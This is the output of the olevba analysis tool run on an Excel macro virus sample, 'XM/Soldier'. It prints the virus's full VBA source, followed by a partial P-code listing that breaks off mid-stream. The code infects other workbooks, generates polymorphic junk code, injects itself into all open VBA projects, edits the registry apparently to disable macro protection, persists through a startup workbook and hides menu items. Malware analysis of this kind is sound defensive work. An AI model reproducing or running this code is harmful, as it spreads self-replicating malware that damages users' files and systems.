olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Soldier.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO NTNUNJKMB.bas 
in file: Virus.MSExcel.Soldier.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/NTNUNJKMB'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'N9#
'57nVKF @[hVu;{`gUyTxqmw)k!UeI
'+dc:2(0U^|q[9|YAJZG#E
'26GD
'"JAe6}I]5&>{a[xEp-j j
Function wxb()
t = 5592
wd = 8957
iymxaj = 12875
dbbasoclhn = 7894
End Function
Function ekmiiwsuph()
Dim xclgsfdmmrf
Dim kdvhmcostqwndpd
End Function
Function pbmoxwdlvpolknbi()
Dim cqliygev
Dim jjye
Dim qlxurjohodev
Dim utrbdflqubibr
Dim pfnblwht
End Function
Function jsplurhsady()
Attribute jsplurhsady.VB_ProcData.VB_Invoke_Func = " \n14"
'zAel&<<,A!dIzqJd|AN5l
End Function
Function giuupchqpordf()
Attribute giuupchqpordf.VB_ProcData.VB_Invoke_Func = " \n14"
Dim gynxapc
Dim mgkpmhmdaqylbvl
Dim xmcmxfixlhelccdt
Dim ckjx
'Lk1
'!ygw
Dim uxclq
Dim lw
Dim unpexqvrv
Dim sffiwxooh
End Function
'kG2/h/:2+}<mDyKR|=5y
'$}!lRw4DO07770k/%C[\w%v}
'SlSGP:3Hb23Lj\)DM
'&5{6E_R*;cK@m`-
'7BOfOO\!|M_6S<xOigA-Pv$j
'_%A%=wX"XdOY-Dpl%G]uM4@wIP4
't23I,=dO
Function btsdydqprndofg()
Attribute btsdydqprndofg.VB_ProcData.VB_Invoke_Func = " \n14"
'AgMGQnc[B.R)Go,T
Dim snnont
Dim kqp
Dim dijuqwihmcdd
Dim xk
Dim xpeimoacmqjmicl
'}m:7ctS8Wr(F$|WdpMQrpI"
Dim xamq
Dim busposbvkkmeq
Dim kr
Dim najakbmkeehogmy
Dim okvtpxnaeuojd
Dim mafcvpqlg
End Function

Function lcrdymnn()
Attribute lcrdymnn.VB_ProcData.VB_Invoke_Func = " \n14"
'SAv0h
End Function
Function yivkhdkutsws()
Attribute yivkhdkutsws.VB_ProcData.VB_Invoke_Func = " \n14"
'2%`r!^t@Nk&A1nt@&
Dim tusvek
End Function
'b4R8KEuY5qHPD&&(B8Aq
'75&\:168>a#&J

'XM/Soldier by Lord Natas [Codebreakers]
'Huge thanks to VicodinES
'Dedicated to all soldiers
'Who gave their lives
'To make ours better

Function Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").MenuItems("&Hide").Delete
    MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").MenuItems("&Unhide...").Delete
End Function

Function Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    Application.EnableCancelKey = xlDisabled
    Randomize
    If Asc(UCase$(Left$(CurDir$(), 1))) < 67 Then GoTo e
    fn$ = Dir("*.xls")
    w$ = ActiveWorkbook.Name
    b = ActiveWorkbook.Saved
    Do While fn$ <> ""
        If UCase$(fn$) <> UCase$(ActiveWorkbook.Name) And Rnd() > 0.25 Then
            a = 0
            Workbooks.Open fn$
            If Workbooks(fn$).Modules.Count <> 0 Then GoTo c
            Randomize
            r$ = ""
            For i = 1 To Int(Rnd() * 15) + 2
                r$ = r$ + Chr$(Int(Rnd() * (90 - 65) + 65))
            Next
            Workbooks(w$).Sheets(1).Copy Before:=Workbooks(fn$).Sheets(1)
            Randomize
            If Rnd() < 0.5 Then
                Poly
                If Rnd() > Rnd() Then
                    Workbooks(fn$).Modules(1).InsertFile fileName:="c:\soldier.___", Merge:=True
                Else
                    Workbooks(fn$).Modules(1).InsertFile fileName:="c:\soldier.___"
                End If
                Kill "c:\soldier.___"
            End If
            Workbooks(fn$).Sheets(1).Name = r$
            Workbooks(fn$).Sheets(1).Visible = 0
            Workbooks(fn$).Save
c:
            Workbooks(fn$).Close
    End If
    fn$ = Dir()
    Loop
e:
    If ActiveWorkbook.Saved <> b Then ActiveWorkbook.Saved = b
    Randomize
    If Int(Rnd() * 75) = 25 Then
        Application.ScreenUpdating = True
        d$ = "Microsoft Excel"
        For i = 1 To 103
            d$ = " " & d$
            Application.Caption = d$
            Delay
        Next i
        For i = 103 To 1 Step -1
            d$ = Right$(d$, (Len(d$) - 1))
            Application.Caption = d$
            Delay
        Next
    End If
    Application.ScreenUpdating = True
    Application.DisplayAlerts = True
End Function

Function Delay()
Attribute Delay.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    For j = 1 To 40000
    Next j
End Function

Function Poly()
Attribute Poly.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Randomize
    For k = 1 To Int(Rnd() * 5) + 1
        Open "c:\soldier.___" For Append As #1
        m = Int(Rnd() * 3)
        Randomize
        Select Case m
        Case 0
            aa$ = ""
            For y = 1 To Int(Rnd() * 15) + 2
                aa$ = aa$ + Chr$(Int(Rnd() * (122 - 97) + 97))
            Next y
            Print #1, "Function " & aa$ & "()"
            Randomize
            For y = 1 To Int(Rnd() * 6) + 1
                ab$ = ""
                Randomize
                If Rnd() > Rnd() Then
                    For z = 1 To Int(Rnd() * 24) + 1
                        ab$ = ab$ + Chr$(Int(Rnd() * (126 - 32) + 32))
                    Next z
                    Print #1, Chr$(39) & ab$
                Else
                    Randomize
                    For x = 1 To Int(Rnd() * 5) + 1
                        ab$ = ""
                        Randomize
                        For z = 1 To Int(Rnd() * 15) + 2
                            ab$ = ab$ + Chr$(Int(Rnd() * (122 - 97) + 97))
                        Next z
                        Print #1, "Dim " & ab$
                    Next x
                End If
            Next y
            Print #1, "End Function"
        Case 1
            Randomize
            For y = 1 To Int(Rnd() * 6) + 1
                ab$ = ""
                For z = 1 To Int(Rnd() * 30) + 1
                    ab$ = ab$ + Chr$(Int(Rnd() * (126 - 32) + 32))
                Next z
                Print #1, Chr$(39) & ab$
            Next y
        Case 2
            Randomize
            aa$ = ""
            For y = 1 To Int(Rnd() * 15) + 1
                aa$ = aa$ + Chr$(Int(Rnd() * (122 - 97) + 97))
            Next y
            Print #1, "Function " & aa$ & "()"
            Randomize
            For y = 1 To Int(Rnd() * 4) + 1
                ab$ = ""
                Randomize
                For z = 1 To Int(Rnd() * 15) + 1
                    ab$ = ab$ + Chr$(Int(Rnd() * (122 - 97) + 97))
                Next z
                Print #1, ab$ & " =" & Str$(Int(Rnd() * 30000) + 1)
            Next y
            Print #1, "End Function"
        End Select
        Close #1
    Next k
End Function
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Soldier.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Text 'FRIEND
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" _
(ByVal hKey As Long, ByVal lpSubKey As _
String, ByVal ulOptions As Long, ByVal samDesired As _
Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" _
(ByVal hKey As Long, ByVal lpValueName As _
String, ByVal Reserved As Long, ByVal dwType As Long, _
lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" _
(ByVal hKey As Long) As Long
Const HKEY_CURRENT_USER = &H80000001
Const KEY_ALL_ACCESS = &H3F
Const lngData As Long = 0
Const REG_DWORD As Long = 4
Private Sub Workbook_Activate()
Infect
End Sub
Function Infect()
On Error GoTo xnctsg
Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
For Each yactgf In VBProject.VBE.VBProjects
xcctsg = yactgf.VBComponents.Count
For Each xcctxg In yactgf.VBComponents
yactxg = xcctxg.Name
If yactxg = "ThisWorkbook" Then
If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
With yactgf.VBComponents(yactxg).CodeModule
For asjjh = 1 To 4
.DeleteLines 1
Next asjjh
End With
End If
End If
Next xcctxg
5 Next yactgf
Exit Function
xnctsg:
If Err.Number = 50289 Then
Err.Clear
Resume 5
End If
End Function
Private Sub Workbook_Open()
u = RegOpenKeyExA(HKEY_CURRENT_USER, _
"Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
u = RegCloseKey(k)
Application.DisplayAlerts = False
Application.ScreenUpdating = False
For Each wbxxc In Workbooks
If wbxxc.Name = "sys.xls" And ThisWorkbook.Name <> "sys.xls" Then
Application.DisplayAlerts = True
Application.ScreenUpdating = True
Exit Sub
End If
If wbxxc.Name = "sys.xls" And ThisWorkbook.Name = "sys.xls" Then GoTo 99
Next wbxxc
Application.Workbooks.Add
ActiveWorkbook.SaveAs (Application.StartupPath & "\sys.xls")
ActiveWindow.Visible = True
99 On Error GoTo xnctsg
If ThisWorkbook.Name = "sys.xls" Then
Application.Workbooks.Add
End If
Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
For Each yactgf In VBProject.VBE.VBProjects
xcctsg = yactgf.VBComponents.Count
For Each xcctxg In yactgf.VBComponents
yactxg = xcctxg.Name
If yactxg = "ThisWorkbook" Then
If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
With yactgf.VBComponents(yactxg).CodeModule
For asjjh = 1 To 4
.DeleteLines 1
Next asjjh
End With
End If
End If
Next xcctxg
5 Next yactgf
Application.Workbooks("sys.xls").Close savechanges:=True
Application.DisplayAlerts = True
Application.ScreenUpdating = True
Exit Sub
xnctsg:
If Err.Number = 50289 Then
Err.Clear
Resume 5
End If
End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean)
u = RegOpenKeyExA(HKEY_CURRENT_USER, _
"Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
KEY_ALL_ACCESS, k)
u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
u = RegCloseKey(k)
If ThisWorkbook.Name = "sys.xls" Then Exit Sub
Infect
End Sub

























-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Soldier.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Soldier.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Soldier.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  NTNUNJKM
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Soldier.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/NTNUNJKMB - 13898 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0003 "N9#"
' Line #2:
' 	QuoteRem 0x0000 0x001D "57nVKF @[hVu;{`gUyTxqmw)k!UeI"
' Line #3:
' 	QuoteRem 0x0000 0x0015 "+dc:2(0U^|q[9|YAJZG#E"
' Line #4:
' 	QuoteRem 0x0000 0x0004 "26GD"
' Line #5:
' 	QuoteRem 0x0000 0x0015 ""JAe6}I]5&>{a[xEp-j j"
' Line #6:
' 	FuncDefn (Function wxb())
' Line #7:
' 	LitDI2 0x15D8 
' 	St t 
' Line #8:
' 	LitDI2 0x22FD 
' 	St wd 
' Line #9:
' 	LitDI2 0x324B 
' 	St iymxaj 
' Line #10:
' 	LitDI2 0x1ED6 
' 	St dbbasoclhn 
' Line #11:
' 	EndFunc 
' Line #12:
' 	FuncDefn (Function ekmiiwsuph())
' Line #13:
' 	Dim 
' 	VarDefn xclgsfdmmrf
' Line #14:
' 	Dim 
' 	VarDefn kdvhmcostqwndpd
' Line #15:
' 	EndFunc 
' Line #16:
' 	FuncDefn (Function pbmoxwdlvpolknbi())
' Line #17:
' 	Dim 
' 	VarDefn cqliygev
' Line #18:
' 	Dim 
' 	VarDefn jjye
' Line #19:
' 	Dim 
' 	VarDefn qlxurjohodev
' Line #20:
' 	Dim 
' 	VarDefn utrbdflqubibr
' Line #21:
' 	Dim 
' 	VarDefn pfnblwht
' Line #22:
' 	EndFunc 
' Line #23:
' 	FuncDefn (Function jsplurhsady())
' Line #24:
' 	QuoteRem 0x0000 0x0015 "zAel&<<,A!dIzqJd|AN5l"
' Line #25:
' 	EndFunc 
' Line #26:
' 	FuncDefn (Function giuupchqpordf())
' Line #27:
' 	Dim 
' 	VarDefn gynxapc
' Line #28:
' 	Dim 
' 	VarDefn mgkpmhmdaqylbvl
' Line #29:
' 	Dim 
' 	VarDefn xmcmxfixlhelccdt
' Line #30:
' 	Dim 
' 	VarDefn ckjx
' Line #31:
' 	QuoteRem 0x0000 0x0003 "Lk1"
' Line #32:
' 	QuoteRem 0x0000 0x0004 "!ygw"
' Line #33:
' 	Dim 
' 	VarDefn uxclq
' Line #34:
' 	Dim 
' 	VarDefn lw
' Line #35:
' 	Dim 
' 	VarDefn unpexqvrv
' Line #36:
' 	Dim 
' 	VarDefn sffiwxooh
' Line #37:
' 	EndFunc 
' Line #38:
' 	QuoteRem 0x0000 0x0014 "kG2/h/:2+}<mDyKR|=5y"
' Line #39:
' 	QuoteRem 0x0000 0x0018 "$}!lRw4DO07770k/%C[\w%v}"
' Line #40:
' 	QuoteRem 0x0000 0x0011 "SlSGP:3Hb23Lj\)DM"
' Line #41:
' 	QuoteRem 0x0000 0x000F "&5{6E_R*;cK@m`-"
' Line #42:
' 	QuoteRem 0x0000 0x0018 "7BOfOO\!|M_6S<xOigA-Pv$j"
' Line #43:
' 	QuoteRem 0x0000 0x001B "_%A%=wX"XdOY-Dpl%G]uM4@wIP4"
' Line #44:
' 	QuoteRem 0x0000 0x0008 "t23I,=dO"
' Line #45:
' 	FuncDefn (Function btsdydqprndofg())
' Line #46:
' 	QuoteRem 0x0000 0x0010 "AgMGQnc[B.R)Go,T"
' Line #47:
' 	Dim 
' 	VarDefn snnont
' Line #48:
' 	Dim 
' 	VarDefn kqp
' Line #49:
' 	Dim 
' 	VarDefn dijuqwihmcdd
' Line #50:
' 	Dim 
' 	VarDefn xk
' Line #51:
' 	Dim 
' 	VarDefn xpeimoacmqjmicl
' Line #52:
' 	QuoteRem 0x0000 0x0017 "}m:7ctS8Wr(F$|WdpMQrpI""
' Line #53:
' 	Dim 
' 	VarDefn xamq
' Line #54:
' 	Dim 
' 	VarDefn busposbvkkmeq
' Line #55:
' 	Dim 
' 	VarDefn kr
' Line #56:
' 	Dim 
' 	VarDefn najakbmkeehogmy
' Line #57:
' 	Dim 
' 	VarDefn okvtpxnaeuojd
' Line #58:
' 	Dim 
' 	VarDefn mafcvpqlg
' Line #59:
' 	EndFunc 
' Line #60:
' Line #61:
' 	FuncDefn (Function lcrdymnn())
' Line #62:
' 	QuoteRem 0x0000 0x0005 "SAv0h"
' Line #63:
' 	EndFunc 
' Line #64:
' 	FuncDefn (Function yivkhdkutsws())
' Line #65:
' 	QuoteRem 0x0000 0x0011 "2%`r!^t@Nk&A1nt@&"
' Line #66:
' 	Dim 
' 	VarDefn tusvek
' Line #67:
' 	EndFunc 
' Line #68:
' 	QuoteRem 0x0000 0x0014 "b4R8KEuY5qHPD&&(B8Aq"
' Line #69:
' 	QuoteRem 0x0000 0x000D "75&\:168>a#&J"
' Line #70:
' Line #71:
' 	QuoteRem 0x0000 0x0027 "XM/Soldier by Lord Natas [Codebreakers]"
' Line #72:
' 	QuoteRem 0x0000 0x0018 "Huge thanks to VicodinES"
' Line #73:
' 	QuoteRem 0x0000 0x0019 "Dedicated to all soldiers"
' Line #74:
' 	QuoteRem 0x0000 0x0014 "Who gave their lives"
' Line #75:
' 	QuoteRem 0x0000 0x0013 "To make ours better"
' Line #76:
' Line #77:
' 	FuncDefn (Function Auto_Open())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	LitStr 0x0005 "&Hide"
' 	LitStr 0x0006 "S&heet"
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #80:
' 	LitStr 0x000A "&Unhide..."
' 	LitStr 0x0006 "S&heet"
' 	LitStr 0x0006 "Format"
' 	Ld xlWorksheet 
' 	ArgsLd MenuBars 0x0001 
' 	ArgsMemLd Menus 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemLd MenuItems 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #81:
' 	EndFunc 
' Line #82:
' Line #83:
' 	FuncDefn (Function Auto_Close())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #87:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #88:
' 	ArgsCall Read 0x0000 
' Line #89:
' 	ArgsLd CurDir$ 0x0000 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	ArgsLd UCase$ 0x0001 
' 	ArgsLd Asc 0x0001 
' 	LitDI2 0x0043 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo e 
' 	EndIf 
' Line #90:
' 	LitStr 0x0005 "*.xls"
' 	ArgsLd Dir 0x0001 
' 	St fn$ 
' Line #91:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St w$ 
' Line #92:
' 	Ld ActiveWorkbook 
' 	MemLd Saved 
' 	St B 
' Line #93:
' 	Ld fn$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #94:
' 	Ld fn$ 
' 	ArgsLd UCase$ 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	ArgsLd UCase$ 0x0001 
' 	Ne 
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FD0 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #95:
' 	LitDI2 0x0000 
' 	St a 
' Line #96:
' 	Ld fn$ 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0001 
' Line #97:
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo c 
' 	EndIf 
' Line #98:
' 	ArgsCall Read 0x0000 
' Line #99:
' 	LitStr 0x0000 ""
' 	St r$ 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #101:
' 	Ld r$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x0041 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St r$ 
' Line #102:
' 	StartForVariable 
' 	Next 
' Line #103:
' 	LitDI2 0x0001 
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed Before 
' 	LitDI2 0x0001 
' 	Ld w$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #104:
' 	ArgsCall Read 0x0000 
' Line #105:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Lt 
' 	IfBlock 
' Line #106:
' 	ArgsCall Poly 0x0000 
' Line #107:
' 	ArgsLd Rnd 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	Gt 
' 	IfBlock 
' Line #108:
' 	LitStr 0x000E "c:\soldier.___"
' 	ParamNamed fileName 
' 	LitVarSpecial (True)
' 	ParamNamed Merge 
' 	LitDI2 0x0001 
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall InsertFile 0x0002 
' Line #109:
' 	ElseBlock 
' Line #110:
' 	LitStr 0x000E "c:\soldier.___"
' 	ParamNamed fileName 
' 	LitDI2 0x0001 
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall InsertFile 0x0001 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	LitStr 0x000E "c:\soldier.___"
' 	ArgsCall Kill 0x0001 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Ld r$ 
' 	LitDI2 0x0001 
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt New 
' Line #115:
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #116:
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #117:
' 	Label c 
' Line #118:
' 	Ld fn$ 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	ArgsLd Dir 0x0000 
' 	St fn$ 
' Line #121:
' 	Loop 
' Line #122:
' 	Label e 
' Line #123:
' 	Ld ActiveWorkbook 
' 	MemLd Saved 
' 	Ld B 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	Ld ActiveWorkbook 
' 	MemSt Saved 
' 	EndIf 
' Line #124:
' 	ArgsCall Read 0x0000 
' Line #125:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #126:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #127:
' 	LitStr 0x000F "Microsoft Excel"
' 	St d$ 
' Line #128:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0067 
' 	For 
' Line #129:
' 	LitStr 0x0001 " "
' 	Ld d$ 
' 	Concat 
' 	St d$ 
' Line #130:
' 	Ld d$ 
' 	Ld Application 
' 	MemSt Caption 
' Line #131:
' 	ArgsCall Delay 0x0000 
' Line #132:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0067 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #134:
' 	Ld d$ 
' 	Ld d$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	ArgsLd Right$ 0x0002 
' 	St d$ 
' Line #135:
' 	Ld d$ 
' 	Ld Application 
' 	MemSt Caption 
' Line #136:
' 	ArgsCall Delay 0x0000 
' Line #137:
' 	StartForVariable 
' 	Next 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #140:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #141:
' 	EndFunc 
' Line #142:
' Line #143:
' 	FuncDefn (Function Delay())
' Line #144:
' 	OnError (Resume Next) 
' Line #145:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x9C40 0x0000 
' 	For 
' Line #146:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #147:
' 	EndFunc 
' Line #148:
' Line #149:
' 	FuncDefn (Function Poly())
' Line #150:
' 	OnError (Resume Next) 
' Line #151:
' 	ArgsCall Read 0x0000 
' Line #152:
' 	StartForVariable 
' 	Ld k 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #153:
' 	LitStr 0x000E "c:\soldier.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #154:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	St m 
' Line #155:
' 	ArgsCall Read 0x0000 
' Line #156:
' 	Ld m 
' 	SelectCase 
' Line #157:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #158:
' 	LitStr 0x0000 ""
' 	St aa$ 
' Line #159:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #160:
' 	Ld aa$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St aa$ 
' Line #161:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "Function "
' 	Ld aa$ 
' 	Concat 
' 	LitStr 0x0002 "()"
' 	Concat 
' 	PrintItemNL 
' Line #163:
' 	ArgsCall Read 0x0000 
' Line #164:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0006 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #165:
' 	LitStr 0x0000 ""
' 	St ab$ 
' Line #166:
' 	ArgsCall Read 0x0000 
' Line #167:
' 	ArgsLd Rnd 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	Gt 
' 	IfBlock 
' Line #168:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0018 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #169:
' 	Ld ab$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007E 
' 	LitDI2 0x0020 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St ab$ 
' Line #170:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Ld ab$ 
' 	Concat 
' 	PrintItemNL 
' Line #172:
' 	ElseBlock 
' Line #173:
' 	ArgsCall Read 0x0000 
' Line #174:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #175:
' 	LitStr 0x0000 ""
' 	St ab$ 
' Line #176:
' 	ArgsCall Read 0x0000 
' Line #177:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #178:
' 	Ld ab$ 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x007A 
' 	LitDI2 0x0061 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
